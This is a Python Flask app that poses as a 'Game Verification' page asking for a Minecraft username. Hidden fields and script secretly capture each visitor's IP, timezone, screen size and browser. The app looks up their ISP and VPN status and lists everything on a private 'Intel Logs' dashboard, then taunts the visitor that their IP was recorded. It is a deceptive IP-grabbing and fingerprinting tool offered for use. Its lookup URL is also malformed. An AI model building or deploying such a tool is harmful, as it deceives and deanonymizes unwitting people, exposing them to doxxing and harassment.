from flask import Flask, request, render_template_string, session, redirect, url_for
import datetime
import os
import requests

app = Flask(__name__)
app.secret_key = "289fj9f28ur29f2i09283ufaewiqjq39"

# --- CONFIG ---
ADMIN_PASSWORD = "Your-Seret-Password"
recorded_ips = []

# --- HTML TEMPLATES ---

VERIFY_HTML = """
<!DOCTYPE html>
<html>
<head><title>Game Verification</title><style>
    body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .box { background: #333; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    input { padding: 10px; width: 220px; border: none; border-radius: 4px; margin-bottom: 10px; font-size: 16px; }
    button { padding: 10px 20px; background: #52a054; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
</style></head>
<body>
    <div class="box">
        <h2>Game Verification</h2>
        <p style="color: #bbb;">Enter your username to verify your IP.</p>
        <form method="POST" id="verifyForm">
            <input type="text" name="mc_name" placeholder="e.g. Minecraft Username, Nickname, etc..." required autofocus>
            <!-- Hidden inputs to be filled by JavaScript -->
            <input type="hidden" name="timezone" id="tz">
            <input type="hidden" name="screen" id="sc">
            <br><button type="submit">Verify</button>
        </form>
    </div>
    <script>
        // Grab local browser info
        document.getElementById('tz').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
        document.getElementById('sc').value = window.screen.width + "x" + window.screen.height;
    </script>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><title>Intel Dashboard</title><style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
    table { width: 100%; border-collapse: collapse; background: white; font-size: 13px; }
    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
    th { background: #333; color: white; }
    .vpn-yes { color: red; font-weight: bold; }
    .vpn-no { color: green; }
</style></head>
<body>
    <div style="display: flex; justify-content: space-between;">
        <h1>Intel Logs</h1>
        <form action="/clear" method="POST"><button style="background:red; color:white;">CLEAR</button></form>
    </div>
    <table>
        <tr>
            <th>User</th>
            <th>IP / ISP</th>
            <th>VPN?</th>
            <th>Timezone</th>
            <th>Device/Browser</th>
            <th>Screen</th>
        </tr>
        {% for e in logs %}
        <tr>
            <td><strong>{{ e.name }}</strong></td>
            <td><code>{{ e.ip }}</code><br><small>{{ e.isp }}</small></td>
            <td class="{{ 'vpn-yes' if e.vpn == 'YES' else 'vpn-no' }}">{{ e.vpn }}</td>
            <td>{{ e.tz }}</td>
            <td><small>{{ e.ua }}</small></td>
            <td>{{ e.screen }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# --- HELPERS ---

def get_ip_intel(ip):
    try:
        # Check ISP and VPN status
        r = requests.get(f"http://ip-api.com{ip}?fields=status,isp,proxy,hosting", timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            is_vpn = "YES" if (data.get('proxy') or data.get('hosting')) else "NO"
            return data.get('isp'), is_vpn
        return "Unknown ISP", "Unknown"
    except:
        return "Lookup Error", "Error"

# --- ROUTES ---

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        name = request.form.get('mc_name')
        tz = request.form.get('timezone', 'Unknown')
        screen = request.form.get('screen', 'Unknown')
        ua = request.headers.get('User-Agent', 'Unknown')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        
        isp, vpn = get_ip_intel(ip)
        
        recorded_ips.append({
            "name": name, "ip": ip, "isp": isp, "vpn": vpn,
            "tz": tz, "ua": ua, "screen": screen,
            "time": datetime.datetime.now().strftime("%I:%M %p")
        })
        return "<h1>YOUR IP HAS BEEN RECORDED LOL</h1>"
    return render_template_string(VERIFY_HTML)

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if request.method == 'POST' and request.form.get('password') == ADMIN_PASSWORD:
        session['logged_in'] = True
    if not session.get('logged_in'):
        return '<form method="POST">Pass: <input type="password" name="password"><input type="submit"></form>'
    return render_template_string(DASHBOARD_HTML, logs=recorded_ips[::-1])

@app.route('/clear', methods=['POST'])
def clear_logs():
    if session.get('logged_in'): recorded_ips.clear()
    return redirect(url_for('dashboard'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
